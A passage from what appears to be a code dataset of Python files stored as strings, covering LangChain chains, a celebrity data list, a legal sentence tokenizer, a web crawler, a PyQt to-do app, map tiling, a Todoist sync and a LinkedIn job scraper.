= True, output_key='horoscope')\n\nthird_input_prompt_template = PromptTemplate(\n    input_variables = ['horoscope']\n    template =\"List 5 celebrities who have the same {horoscope}\"\n)\nchain3 = LLMChain(llm=llm, prompt = third_input_prompt_template, verbose = True, output_key='persons')\n\n\n\nperson_memory = ConversationBufferMemory(input_key='person', memory_key='chat_history')\nhoroscope_memory = ConversationBufferMemory(input_key='horoscope', memory_key='chat_history')\npersons_memory = ConversationBufferMemory(input_key='persons', memory_key='description_history')\n\n\nmain_chain = SequentialChain(chains= [chain, chain2, chain3], input_variables = ['name'], output_variables = ['person', 'horoscope', 'persons'], verbose=True)\n\n\nif input_text:\n    st.write(main_chain.run({'name':input_text}))",
    "# data.py\r\n# -*- coding: utf-8 -*\r\ndata = [\r\n    {\r\n        'name': 'Instagram',\r\n        'follower_count': 346,\r\n        'description': 'Social media platform',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Cristiano Ronaldo',\r\n        'follower_count': 215,\r\n        'description': 'Footballer',\r\n        'country': 'Portugal'\r\n    },\r\n    {\r\n        'name': 'Ariana Grande',\r\n        'follower_count': 183,\r\n        'description': 'Musician and actress',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Dwayne Johnson',\r\n        'follower_count': 181,\r\n        'description': 'Actor and professional wrestler',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Selena Gomez',\r\n        'follower_count': 174,\r\n        'description': 'Musician and actress',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Kylie Jenner',\r\n        'follower_count': 172,\r\n        'description': 'Reality TV personality and businesswoman and Self-Made Billionaire',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Kim Kardashian',\r\n        'follower_count': 167,\r\n        'description': 'Reality TV personality and businesswoman',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Lionel Messi',\r\n        'follower_count': 149,\r\n        'description': 'Footballer',\r\n        'country': 'Argentina'\r\n    },\r\n    {\r\n        'name': 'Beyonce',\r\n        'follower_count': 145,\r\n        'description': 'Musician',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Neymar',\r\n        'follower_count': 138,\r\n        'description': 'Footballer',\r\n        'country': 'Brasil'\r\n    },\r\n    {\r\n        'name': 'National Geographic',\r\n        'follower_count': 135,\r\n        'description': 'Magazine',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Justin Bieber',\r\n        'follower_count': 133,\r\n        'description': 'Musician',\r\n        'country': 'Canada'\r\n    },\r\n    {\r\n        'name': 'Taylor Swift',\r\n        'follower_count': 131,\r\n        'description': 'Musician',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Kendall Jenner',\r\n        'follower_count': 127,\r\n        'description': 'Reality TV personality and Model',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Jennifer Lopez',\r\n        'follower_count': 119,\r\n        'description': 'Musician and actress',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Nicki Minaj',\r\n        'follower_count': 113,\r\n        'description': 'Musician',\r\n        'country': 'Trinidad and Tobago'\r\n    },\r\n    {\r\n        'name': 'Nike',\r\n        'follower_count': 109,\r\n        'description': 'Sportswear multinational',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Khloe Kardashian',\r\n        'follower_count': 108,\r\n        'description': 'Reality TV personality and businesswoman',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Miley Cyrus',\r\n        'follower_count': 107,\r\n        'description': 'Musician and actress',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Katy Perry',\r\n        'follower_count': 94,\r\n        'description': 'Musician',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Kourtney Kardashian',\r\n        'follower_count': 90,\r\n        'description': 'Reality TV personality',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Kevin Hart',\r\n        'follower_count': 89,\r\n        'description': 'Comedian and actor',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Ellen DeGeneres',\r\n        'follower_count': 87,\r\n        'description': 'Comedian',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Real Madrid CF',\r\n        'follower_count': 86,\r\n        'description': 'Football club',\r\n        'country': 'Spain'\r\n    },\r\n    {\r\n        'name': 'FC Barcelona',\r\n        'follower_count': 85,\r\n        'description': 'Football club',\r\n        'country': 'Spain'\r\n    },\r\n    {\r\n        'name': 'Rihanna',\r\n        'follower_count': 81,\r\n        'description': 'Musician and businesswoman',\r\n        'country': 'Barbados'\r\n    },\r\n    {\r\n        'name': 'Demi Lovato',\r\n        'follower_count': 80,\r\n        'description': 'Musician and actress',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': \"Victoria's Secret\",\r\n        'follower_count': 69,\r\n        'description': 'Lingerie brand',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Zendaya',\r\n        'follower_count': 68,\r\n        'description': 'Actress and musician',\r\n        'country': 'United States'\r\n    },\r\n    {\r\n        'name': 'Shakira',\r\n        'follower_count': 66,\r\n        'description': 'Musician',\r\n        'country': 'Colombia'\r\n    },\r\n    {\r\n        'name': 'Drake',\r\n        'follower_count': 65,\r\n        'description': 'Musician',\r\n        'country",
    "import re\nimport pandas as pd\nimport nltk\n\ntry:\n    nltk.data.find(\"tokenizers/punkt\")\nexcept:\n    nltk.download(\"punkt\", quiet=True)\n\ndef fix_sent_tokenization(sents, min_words, debug=False):\n    '''\n    Implement heuristics to improve quality of sentence tokenization.\n    It will merge sentences that are too short or contain domain-specific\n    paragraph markers.\n    '''\n    jj = 0\n\n    def is_mergeable(sent, previous_sent):\n        prev_is_short_sentence = len(previous_sent.split()) < min_words\n        is_short_sentence = len(sent.split()) < min_words\n        start_with_non_alpha = re.match(r'^([^\\w]|\\d)+.*', sent.strip())\n        is_paragraph_number = re.match(r'^\\d+\\.$', sent.strip()) is not None\n        starts_with_paragraph_number = re.match(r'^\\d+\\.\\s.*', sent.strip()) is not None\n\n        mergeable = sent[0].islower() or prev_is_short_sentence or is_short_sentence or start_with_non_alpha\n        mergeable = mergeable and not (starts_with_paragraph_number or is_paragraph_number)\n        return mergeable\n\n    mergeable_sents = [is_mergeable(sents[ii], sents[ii-1]) for ii in range(1, len(sents))]\n\n    while len(sents) > 1 and any(mergeable_sents):\n\n        new_sents = [sents[0]]\n        mergeable_sents = [False]\n\n        for ii, sent in enumerate(sents[1:]):\n            previous_sent = new_sents[-1].strip()\n            mergeable = is_mergeable(sent, previous_sent)\n            mergeable_sents.append(mergeable)\n            \n            if mergeable:\n                new_sents[-1] = ' '.join([previous_sent, sent])\n            else:\n                new_sents.append(sent)\n\n        sents = new_sents\n        \n        if debug:\n            import rich\n            \n            for ii in range(len(mergeable_sents)):\n                if mergeable_sents[ii]:\n                    rich.print(ii-1, sents[ii-1])\n                    rich.print(ii, sents[ii])\n\n            jj += 1\n            if jj > 10:\n                break\n    return sents\n\n\ndef clean_sentence(sent):\n    start_with_non_alpha_pattern = re.compile(\"^(_|[^\\w\\@])*\\s\")\n    sent = start_with_non_alpha_pattern.sub(\"\", sent)\n    sent = sent.replace(\"\\n\", \" \")\n    sent = sent.strip()\n    return sent\n\n\ndef legal_sent_tokenize(text, min_words=5):\n    if type(text) == str:\n        sents = nltk.sent_tokenize(text)\n    else:\n        sents = [s for x in text for s in nltk.sent_tokenize(x)]\n    sents = fix_sent_tokenization(sents, min_words=min_words)\n    sents = [clean_sentence(x) for x in sents if x != \"\\n\"]\n    return sents\n\ndef find_paragraph_refs(texts):\n    digit = '(?:\\d\\.?)'\n    connectors = '(?:and|&|\\,|(?:\\,\\s)?to)'\n    start_par = '\\['\n    end_par = '(?:\\]|\\s)'\n    par_pattern = f'{start_par}(Paras?\\s{digit}+(?:\\s?{connectors}\\s?{digit}+)*){end_par}'\n    par_pattern = re.compile(par_pattern)\n\n    def get_digits(texts):\n        digits = []\n        for text in texts:\n            text_digits = re.findall(r'\\d+', text)\n            digits.extend(text_digits)\n        return [int(d) for d in digits]\n\n    paragraphs = texts.apply(lambda x: re.findall(par_pattern, x) if re.search(par_pattern, x) else None)\n    paragraphs = paragraphs.apply(lambda x: get_digits(x) if x else None)\n    has_paragraph = len(paragraphs[~paragraphs.isnull()])\n    print(f'{has_paragraph} out of {len(texts)} samples have at least one paragraph')\n    return paragraphs\n\ndef find_paragraphs(text):\n    par = re.split(r'[\\.\\s+](\\d{1,2})\\.\\s+', text)\n    return par\n\ndef process_data(data_split, data_split_paragraphs):\n    par_list = []\n    for itr in range(len(data_split)):\n        par = find_paragraphs(data_split['text'][itr])\n        tup_list = []\n        if len(par) % 2 != 0:\n            tup_list.append((1, par[0],0))\n            for i in range(1,int(len(par)/2)+1):\n                tup_list.append((int(par[2*i-1].strip()), par[2*i].strip(),0))\n        else:\n            for i in range(len(par)/2):\n                tup_list.append((int(par[2*i].strip()), par[2*i+1].strip(),0))\n        par_list.append(tup_list)\n\n    for i in range(len(data_split_paragraphs)):\n        if data_split_paragraphs[i] != None:\n            for j in range(len(data_split_paragraphs[i])):\n                for k in range(len(par_list[i])):\n                    n, t, f = par_list[i][k]\n                    if n == data_split_paragraphs[i][j]:\n                        f = 1\n                    par_list[i][k] = (n, t, f)\n\n    data_split_par_list = par_list\n    data_split_ranks = data_split['rank'].tolist()\n    data_split_summary = data_split['summary'].tolist()\n\n    data_split_processed = pd.DataFrame(list(zip(data_split_ranks, data_split_summary, data_split_par_list)),\n                columns=['rank', 'summary', 'paragraph_label'])\n\n    doc_id = []\n    doc_summary = []\n    par_number = []\n    par_text = []\n    label = []\n    for itr in range(len(data_split_processed)):\n        rank = data_split_processed['rank'][itr]\n        summary = data_split_processed['summary'][itr]\n        for i in range(len(data_split_processed['paragraph_labe",
    "import os\r\nimport logging\r\nimport requests\r\nfrom bs4 import BeautifulSoup\r\nfrom urllib.parse import urljoin\r\nfrom concurrent.futures import ThreadPoolExecutor\r\nfrom requests.exceptions import RequestException\r\nfrom requests.adapters import HTTPAdapter\r\nfrom urllib3.util.retry import Retry\r\nfrom dotenv import load_dotenv\r\nfrom threading import Lock\r\n\r\n# Load environment variables from .env file\r\nload_dotenv()\r\n\r\n# Configure logging\r\nlogging.basicConfig(\r\n    format='%(asctime)s - %(levelname)s - %(message)s',\r\n    datefmt='%Y-%m-%d %H:%M:%S',\r\n    level=logging.INFO\r\n)\r\n\r\nclass SimpleCrawler:\r\n    def __init__(self, start_url, max_depth=3, max_threads=5):\r\n        self.start_url = start_url\r\n        self.max_depth = max_depth\r\n        self.visited = set()\r\n        self.max_threads = max_threads\r\n        self.session = self.create_session()\r\n        self.lock = Lock()  # Lock for thread-safe set modification\r\n\r\n    def create_session(self):\r\n        session = requests.Session()\r\n        session.headers.update({'User-Agent': 'SimpleCrawler/1.0'})\r\n\r\n        # Load proxy settings from environment variables\r\n        http_proxy = os.getenv('HTTP_PROXY')\r\n        https_proxy = os.getenv('HTTPS_PROXY')\r\n        proxies = {\r\n            'http': http_proxy,\r\n            'https': https_proxy,\r\n        }\r\n        if http_proxy or https_proxy:\r\n            session.proxies.update(proxies)\r\n\r\n        retries = Retry(\r\n            total=5,\r\n            backoff_factor=1,\r\n            status_forcelist=[500, 502, 503, 504]\r\n        )\r\n        session.mount('http://', HTTPAdapter(max_retries=retries))\r\n        session.mount('https://', HTTPAdapter(max_retries=retries))\r\n        return session\r\n\r\n    def scrape_website(self, url, depth=0):\r\n        if depth > self.max_depth:\r\n            return\r\n        with self.lock:  # Acquire lock before modifying the set\r\n            if url in self.visited:\r\n                return\r\n            self.visited.add(url)\r\n        logging.info(f\"Scraping {url}\")\r\n\r\n        try:\r\n            response = self.session.get(url)\r\n            response.raise_for_status()\r\n\r\n            soup = BeautifulSoup(response.text, 'html.parser')\r\n            plain_text = soup.get_text(separator='\\n', strip=True)\r\n            logging.debug(f\"Content from {url}:\\n{plain_text}\\n\")  # Changed to debug level\r\n\r\n            links = [urljoin(url, link['href']) for link in soup.find_all('a', href=True)]\r\n            links = [link for link in links if link not in self.visited]  # Removed redundant urljoin\r\n\r\n            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:\r\n                futures = [executor.submit(self.scrape_website, link, depth + 1) for link in links]\r\n                for future in futures:\r\n                    future.result()\r\n\r\n        except RequestException as e:\r\n            logging.error(f\"An error occurred while scraping {url}: {e}\")\r\n\r\ndef main():\r\n    start_url = 'https://developers.codegpt.co/'  # Replace with your target URL\r\n    crawler = SimpleCrawler(start_url, max_depth=3, max_threads=10)\r\n    crawler.scrape_website(start_url)\r\n\r\nif __name__ == \"__main__\":\r\n    main()",
    "import sys\r\nfrom PyQt5.QtWidgets import *\r\nfrom PyQt5.QtGui import *\r\nfrom datetime import datetime, timedelta\r\nfrom PyQt5.QtCore import QTimer, QTime\r\nimport telebot\r\n\r\n\r\nclass EditTaskDialog(QDialog):\r\n    def __init__(self, current_task, current_priority, current_time, parent=None):\r\n        super().__init__(parent)\r\n        self.setWindowTitle('\u0420\u0435\u0434\u0430\u043a\u0442\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0437\u0430\u0434\u0430\u0447\u0443')\r\n\r\n        self.task_input = QLineEdit()\r\n        self.task_input.setText(current_task)\r\n\r\n        self.time_input = QTimeEdit()\r\n        self.time_input.setDisplayFormat('HH:mm')\r\n        if current_time:\r\n            self.time_input.setTime(QTime.fromString(current_time, 'HH:mm'))\r\n\r\n        self.priority_label = QLabel('\u041f\u0440\u0438\u043e\u0440\u0438\u0442\u0435\u0442:')\r\n        self.priority_button = QPushButton('\u0412\u044b\u0431\u0440\u0430\u0442\u044c \u0446\u0432\u0435\u0442')\r\n        self.priority_color = QColor(current_priority)\r\n\r\n        layout = QVBoxLayout()\r\n        layout.addWidget(QLabel('\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u0435 \u0437\u0430\u0434\u0430\u0447\u0443:'))\r\n        layout.addWidget(self.task_input)\r\n        layout.addWidget(QLabel('\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u0435 \u0432\u0440\u0435\u043c\u044f \u043d\u0430\u043f\u043e\u043c\u0438\u043d\u0430\u043d\u0438\u044f:'))\r\n        layout.addWidget(self.time_input)\r\n        layout.addWidget(self.priority_label)\r\n        layout.addWidget(self.priority_button)\r\n\r\n        buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)\r\n        buttons.accepted.connect(self.accept)\r\n        buttons.rejected.connect(self.reject)\r\n        layout.addWidget(buttons)\r\n\r\n        self.setLayout(layout)\r\n\r\n        self.priority_button.clicked.connect(self.pick_priority_color)\r\n\r\n    def pick_priority_color(self):\r\n        color = QColorDialog.getColor(self.priority_color, self, '\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0446\u0432\u0435\u0442 \u043f\u0440\u0438\u043e\u0440\u0438\u0442\u0435\u0442\u0430')\r\n        if color.isValid():\r\n            self.priority_color = color\r\n\r\n    def get_updated_task(self):\r\n        return self.task_input.text(), self.priority_color, self.time_input.time().toString('HH:mm')\r\n\r\n\r\nclass ToDoApp(QMainWindow):\r\n    def __init__(self):\r\n        super().__init__()\r\n        self.initUI()\r\n\r\n        # \u0417\u0430\u0433\u0440\u0443\u0437\u0438\u043c \u0434\u0430\u043d\u043d\u044b\u0435 \u043e \u0442\u043e\u043a\u0435\u043d\u0435 \u0431\u043e\u0442\u0430 \u0438 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\r\n        self.bot_token, self.telegram_user_id = self.load_bot_info()\r\n\r\n        # \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u043e\u0431\u044a\u0435\u043a\u0442 \u0442\u0435\u043b\u0435\u0433\u0440\u0430\u043c-\u0431\u043e\u0442\u0430\r\n        self.bot = telebot.TeleBot(self.bot_token)\r\n\r\n\r\n    def initUI(self):\r\n        self.setWindowTitle('\u041f\u0440\u043e\u0441\u0442\u043e\u0435 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u0437\u0430\u0434\u0430\u0447\u0430\u043c\u0438')\r\n        self.setGeometry(100, 100, 600, 400)\r\n\r\n        self.task_input = QLineEdit()\r\n        self.add_button = QPushButton('\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0437\u0430\u0434\u0430\u0447\u0443')\r\n        self.delete_button = QPushButton('\u0423\u0434\u0430\u043b\u0438\u0442\u044c \u0437\u0430\u0434\u0430\u0447\u0443')\r\n        self.edit_button = QPushButton('\u0420\u0435\u0434\u0430\u043a\u0442\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0437\u0430\u0434\u0430\u0447\u0443')\r\n        self.task_list = QListWidget()\r\n        self.time_input = QTimeEdit()\r\n\r\n        layout = QVBoxLayout()\r\n        task_layout = QHBoxLayout()\r\n        task_layout.addWidget(self.task_input)\r\n        task_layout.addWidget(self.add_button)\r\n        task_layout.addWidget(self.delete_button)\r\n        task_layout.addWidget(self.edit_button)\r\n        layout.addLayout(task_layout)\r\n        layout.addWidget(self.task_list)\r\n\r\n        main_widget = QWidget()\r\n        main_widget.setLayout(layout)\r\n        self.setCentralWidget(main_widget)\r\n\r\n        self.add_button.clicked.connect(self.add_task)\r\n        self.delete_button.clicked.connect(self.delete_task)\r\n        self.edit_button.clicked.connect(self.edit_task)\r\n\r\n        self.load_tasks()\r\n\r\n    def add_task(self):\r\n        task_text = self.task_input.text()\r\n        if task_text:\r\n            current_time = self.time_input.time().toString('HH:mm')\r\n            current_time_datetime = datetime.now().replace(hour=int(current_time[:2]), minute=int(current_time[3:]),second=0, microsecond=0)\r\n\r\n            task_with_time = f'{current_time} - {task_text}'\r\n            new_item = QListWidgetItem(task_with_time)\r\n            priority_color = QColorDialog.getColor()\r\n            new_item.setForeground(priority_color)\r\n            new_item.setData(1, priority_color)\r\n            new_item.setData(2, current_time)\r\n            self.task_list.addItem(new_item)\r\n\r\n            # \u0423\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u043d\u0430\u043f\u043e\u043c\u0438\u043d\u0430\u043d\u0438\u0435\r\n            self.schedule_reminder(current_time_datetime, task_text)\r\n\r\n            self.task_input.clear()\r\n            self.save_tasks()\r\n\r\n    def delete_task(self):\r\n        selected_item = self.task_list.currentItem()\r\n        if selected_item:\r\n            self.task_list.takeItem(self.task_list.row(selected_item))\r\n            self.save_tasks()\r\n\r\n    def edit_task(self):\r\n        selected_item = self.task_list.currentItem()\r\n        if selected_item:\r\n            current_task = selected_item.text()\r\n            current_priority = selected_item.data(1)\r\n            current_time = selected_item.data(2)\r\n            edit_dialog = EditTaskDialog(current_task, current_priority, current_time, self)\r\n            if edit_dialog.exec_() == QDialog.Accepted:\r\n                updated_task, updated_priority, updated_time = edit_dialog.get_updated_task()\r\n                selected_item.setText(updated_task)\r\n                selected_item.setData(1, updated_priority)\r\n                selected_item",
    "import json\nimport os\nfrom multiprocessing import Pool\n\nimport geopandas as gpd\nimport mercantile\nfrom shapely.geometry import shape\n\n\ndef split_singe_tile(tile_x, tile_y, tile_z, split_zoom_level):\n    children_tiles = mercantile.children(\n        mercantile.Tile(tile_x, tile_y, tile_z), zoom=split_zoom_level\n    )\n    print(f\"Tile splitted into {len(children_tiles)} children tiles\")\n    features = []\n    for tile in children_tiles:\n        features.append(mercantile.feature(tile))\n    feature_collection = {\"type\": \"FeatureCollection\", \"features\": features}\n    return feature_collection\n\n\ndef polygon_to_tiles(polygon_input, zoom_level):\n    input_crs = \"EPSG:4326\"\n    if isinstance(polygon_input, gpd.GeoDataFrame):\n        gdf = polygon_input\n    elif isinstance(polygon_input, dict):\n        gdf = gpd.GeoDataFrame.from_features(polygon_input, crs=input_crs)\n    elif isinstance(polygon_input, str):\n        if os.path.isfile(polygon_input):\n            gdf = gpd.read_file(polygon_input, crs=input_crs)\n        else:\n            try:\n                polygon_geojson = json.loads(polygon_input)\n                gdf = gpd.GeoDataFrame.from_features(polygon_geojson, crs=input_crs)\n            except json.JSONDecodeError:\n                raise ValueError(\"String input is not a valid GeoJSON or file path.\")\n    else:\n        raise ValueError(\"Invalid geojson input\")\n\n    # gdf = gdf.to_crs(epsg=3857)\n    gdf.plot()\n\n    # Parallel processing for generating tiles\n    with Pool() as pool:\n        features = pool.starmap(\n            process_row, [(row.geometry, zoom_level) for _, row in gdf.iterrows()]\n        )\n\n    features = sum(features, [])\n    print(\n        f\"Found {len(features)} tiles at zoom level {zoom_level} intersecting with the original geometry.\"\n    )\n\n    feature_collection = {\"type\": \"FeatureCollection\", \"features\": features}\n    return feature_collection\n\n\ndef process_row(geometry, zoom_level):\n    west, south, east, north = geometry.bounds\n    tiles = mercantile.tiles(west, south, east, north, zooms=zoom_level)\n    features = []\n    for tile in tiles:\n        tile_feature = mercantile.feature(tile)\n        tile_geom = shape(tile_feature[\"geometry\"])\n        if tile_geom.intersects(geometry):\n            features.append(tile_feature)\n    return features\n",
    "import requests\nimport streamlit as st\n\ndef text_to_speech(text):\n    response = requests.post(\n    'https://api.v6.unrealspeech.com/stream',\n    headers = {\n        'Authorization' : st.secrets['voice_api']\n    },\n    json = {\n        'Text': text, # Up to 1000 characters\n        'VoiceId': 'Scarlett', # Dan, Will, Scarlett, Liv, Amy\n        'Bitrate': '320k', # 320k, 256k, 192k, ...\n        'Speed': '0.2', # -1.0 to 1.0\n        'Pitch': '1', # -0.5 to 1.5\n        'Codec': 'libmp3lame', # libmp3lame or pcm_mulaw\n    }\n    )\n    return response.content\n    \n\n# Define the URL of your chatbot API\nAPI_URL = st.secrets['my_api_endpoint']\n# Function to send a message to the chatbot API and get a response\ndef send_message(message):\n    try:\n        response = requests.post(API_URL, json={\"text\": message})\n        json_response = response.json()\n        if \"response\" in json_response:\n            return json_response[\"response\"]\n        else:\n            return None\n    except Exception as e:\n        st.write('Connection error try again')\n\n# Streamlit app code\ndef main():\n    st.title(\"Bhuman.AI Chatbot Interface\")\n    # Create a text input for user to enter messages\n    user_input = st.text_input(\"Enter a message\")\n\n    # Send the user's message to the chatbot API when a button is clicked\n    if st.button(\"Send\"):\n        bot_response = send_message(user_input)\n        if bot_response is not None:\n            st.text_area(\"Bot's Reply\", value=bot_response, height=200)\n            audio = text_to_speech(bot_response)\n            st.audio(audio)\nif __name__ == \"__main__\":\n    main()",
    "import os\nimport datetime\nimport json\nfrom todoist_api_python.api import TodoistAPI\nfrom Constants import PROJECT_NAME, SECTION_NAME\n\nclass TodoistTasks:\n    def __init__(self, tasks, log_file_path='todoist_tasks_log.json'):\n        self.tasks = tasks\n        self.path = os.path.dirname(os.path.abspath(__file__))\n        self.api_token = self.get_api_token()\n        self.api = TodoistAPI(self.api_token)\n        self.log_file_path = os.path.join(self.path, log_file_path)\n        self.project_id = None\n        self.section_id = None\n\n    def get_api_token(self):\n        try:\n            with open(os.path.join(self.path, 'Token.json'), 'r') as file:\n                data = json.load(file)\n                return data['API_Token']\n        except Exception as e:\n            print(f\"An error occurred while fetching API token: {e}\")\n\n    def get_project_id(self, project_name):\n        try:\n            projects = self.api.get_projects()\n            for project in projects:\n                if project.name == project_name:\n                    return project.id\n        except Exception as e:\n            print(f\"An error occurred while fetching projects: {e}\")\n        return None\n\n    def get_section_id(self, project_id, section_name):\n        try:\n            sections = self.api.get_sections(project_id=project_id)\n            for section in sections:\n                if section.name == section_name:\n                    return section.id\n        except Exception as e:\n            print(f\"An error occurred while fetching sections: {e}\")\n        return None\n\n    def read_task_log(self):\n        if not os.path.exists(self.log_file_path):\n            return []\n        \n        with open(self.log_file_path, 'r') as log_file:\n            return json.load(log_file)\n\n    def write_task_log(self, tasks_log):\n        with open(self.log_file_path, 'w') as log_file:\n            json.dump(tasks_log, log_file)\n\n    def add_task(self, task_name, course_name, due_datetime):\n        due_date = datetime.datetime.strptime(due_datetime, '%Y-%m-%dT%H:%M:%S')\n        if due_date <= datetime.datetime.now():\n            print(f\"Skipping '{task_name}' as its due date is in the past.\")\n            return\n\n        if self.project_id is None:\n            self.project_id = self.get_project_id(PROJECT_NAME)\n        if self.section_id is None:\n            self.section_id = self.get_section_id(self.project_id, SECTION_NAME)\n\n        tasks_log = self.read_task_log()\n        task_log_names = [task['task_name'] for task in tasks_log]\n\n        if task_name not in task_log_names:\n            try:\n                task = self.api.add_task(\n                    content=task_name,\n                    due_date=due_datetime,\n                    labels=[course_name],\n                    priority=2,\n                    project_id=self.project_id,\n                    section_id=self.section_id\n                )\n                print(f\"Task added to Todoist in {PROJECT_NAME} project under {SECTION_NAME} section: {task.content}\")\n\n                tasks_log.append({\n                    'task_name': task_name,\n                    'course_name': course_name,\n                    'created_at': datetime.datetime.now().isoformat(),\n                    'due_date': due_datetime\n                })\n                self.write_task_log(tasks_log)\n            except Exception as e:\n                print(f\"An error occurred while adding the task: {e}\")\n        else:\n            print(f\"Task '{task_name}' already exists in Todoist. No new task created.\")\n\n    def clean_task_log(self):\n        tasks_log = self.read_task_log()\n        current_time = datetime.datetime.now()\n        filtered_log = [task for task in tasks_log if datetime.datetime.strptime(task['due_date'], '%Y-%m-%dT%H:%M:%S') > current_time]\n\n        if len(filtered_log) != len(tasks_log):\n            self.write_task_log(filtered_log)\n            print(\"Cleaned up tasks from log file with due dates in the past.\")\n\n    def sync_tasks(self):\n        self.clean_task_log()\n        for task_name, (course_name, due_datetime) in self.tasks.items():\n            due_date_string = due_datetime.strftime('%Y-%m-%dT%H:%M:%S')\n            self.add_task(task_name, course_name, due_date_string)\n\nif __name__ == '__main__':\n    tasks = {\n        'Homework Quiz #10': ('MA17500-02', datetime.datetime(2024, 4, 2, 13, 0)),\n        'Quiz 21': ('MA16600-03', datetime.datetime(2024, 4, 2, 23, 59)),\n        # Add other tasks as needed\n    }\n\n    # Initialize and authenticate Todoist\n    todoist_tasks = TodoistTasks(tasks)\n    todoist_tasks.sync_tasks()\n",
    "import requests\nimport json\nimport sqlite3\nimport sys\nfrom sqlite3 import Error\nfrom bs4 import BeautifulSoup\nimport time as tm\nfrom itertools import groupby\nfrom datetime import datetime, timedelta, time\nimport pandas as pd\nfrom urllib.parse import quote\nfrom langdetect import detect\nfrom langdetect.lang_detect_exception import LangDetectException\n\n\ndef load_config(file_name):\n    # Load the config file\n    with open(file_name) as f:\n        return json.load(f)\n\ndef get_with_retry(url, config, retries=3, delay=1):\n    # Get the URL with retries and delay\n    for i in range(retries):\n        try:\n            if len(config['proxies']) > 0:\n                r = requests.get(url, headers=config['headers'], proxies=config['proxies'], timeout=5)\n            else:\n                r = requests.get(url, headers=config['headers'], timeout=5)\n            return BeautifulSoup(r.content, 'html.parser')\n        except requests.exceptions.Timeout:\n            print(f\"Timeout occurred for URL: {url}, retrying in {delay}s...\")\n            tm.sleep(delay)\n        except Exception as e:\n            print(f\"An error occurred while retrieving the URL: {url}, error: {e}\")\n    return None\n\ndef transform(soup):\n    # Parsing the job card info (title, company, location, date, job_url) from the beautiful soup object\n    joblist = []\n    try:\n        divs = soup.find_all('div', class_='base-search-card__info')\n    except:\n        print(\"Empty page, no jobs found\")\n        return joblist\n    for item in divs:\n        title = item.find('h3').text.strip()\n        company = item.find('a', class_='hidden-nested-link')\n        location = item.find('span', class_='job-search-card__location')\n        parent_div = item.parent\n        entity_urn = parent_div['data-entity-urn']\n        job_posting_id = entity_urn.split(':')[-1]\n        job_url = 'https://www.linkedin.com/jobs/view/'+job_posting_id+'/'\n\n        date_tag_new = item.find('time', class_ = 'job-search-card__listdate--new')\n        date_tag = item.find('time', class_='job-search-card__listdate')\n        date = date_tag['datetime'] if date_tag else date_tag_new['datetime'] if date_tag_new else ''\n        job_description = ''\n        job = {\n            'title': title,\n            'company': company.text.strip().replace('\\n', ' ') if company else '',\n            'location': location.text.strip() if location else '',\n            'date': date,\n            'job_url': job_url,\n            'job_description': job_description,\n            'applied': 0,\n            'hidden': 0,\n            'interview': 0,\n            'rejected': 0\n        }\n        joblist.append(job)\n    return joblist\n\ndef transform_job(soup):\n    div = soup.find('div', class_='description__text description__text--rich')\n    if div:\n        # Remove unwanted elements\n        for element in div.find_all(['span', 'a']):\n            element.decompose()\n\n        # Replace bullet points\n        for ul in div.find_all('ul'):\n            for li in ul.find_all('li'):\n                li.insert(0, '-')\n\n        text = div.get_text(separator='\\n').strip()\n        text = text.replace('\\n\\n', '')\n        text = text.replace('::marker', '-')\n        text = text.replace('-\\n', '- ')\n        text = text.replace('Show less', '').replace('Show more', '')\n        return text\n    else:\n        return \"Could not find Job Description\"\n\ndef safe_detect(text):\n    try:\n        return detect(text)\n    except LangDetectException:\n        return 'en'\n\ndef remove_irrelevant_jobs(joblist, config):\n    #Filter out jobs based on description, title, and language. Set up in config.json.\n    new_joblist = [job for job in joblist if not any(word.lower() in job['job_description'].lower() for word in config['desc_words'])]   \n    new_joblist = [job for job in new_joblist if not any(word.lower() in job['title'].lower() for word in config['title_exclude'])] if len(config['title_exclude']) > 0 else new_joblist\n    new_joblist = [job for job in new_joblist if any(word.lower() in job['title'].lower() for word in config['title_include'])] if len(config['title_include']) > 0 else new_joblist\n    new_joblist = [job for job in new_joblist if safe_detect(job['job_description']) in config['languages']] if len(config['languages']) > 0 else new_joblist\n    new_joblist = [job for job in new_joblist if not any(word.lower() in job['company'].lower() for word in config['company_exclude'])] if len(config['company_exclude']) > 0 else new_joblist\n\n    return new_joblist\n\ndef remove_duplicates(joblist, config):\n    # Remove duplicate jobs in the joblist. Duplicate is defined as having the same title and company.\n    joblist.sort(key=lambda x: (x['title'], x['company']))\n    joblist 